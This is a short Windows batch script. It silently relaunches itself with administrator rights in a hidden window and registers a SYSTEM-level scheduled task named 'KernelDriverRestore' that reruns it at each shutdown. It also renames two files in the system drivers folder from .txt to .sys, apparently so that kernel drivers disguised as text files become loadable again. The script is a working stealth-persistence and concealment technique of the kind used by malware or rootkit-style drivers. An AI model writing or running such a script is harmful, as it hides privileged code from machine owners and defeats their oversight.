@echo off
set "script_path=%~dp0%~nx0"

net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -command "Start-Process '%script_path%' -Verb RunAs -WindowStyle Hidden"
    exit
)

schtasks /query /tn "KernelDriverRestore" >nul 2>&1
if %errorLevel% neq 0 (
    schtasks /create /tn "KernelDriverRestore" /tr "%script_path%" /sc onevent /ec System /mo "*[System/EventID=1074]" /ru "SYSTEM" /f /rl HIGHEST >nul 2>&1
)

if exist "C:\Windows\System32\drivers\kvmhookx.txt" (
    ren "C:\Windows\System32\drivers\kvmhookx.txt" "kvmhookx.sys" >nul 2>&1
)
if exist "C:\Windows\System32\drivers\xinputv1a.txt" (
    ren "C:\Windows\System32\drivers\xinputv1a.txt" "xinputv1a.sys" >nul 2>&1
)

exit
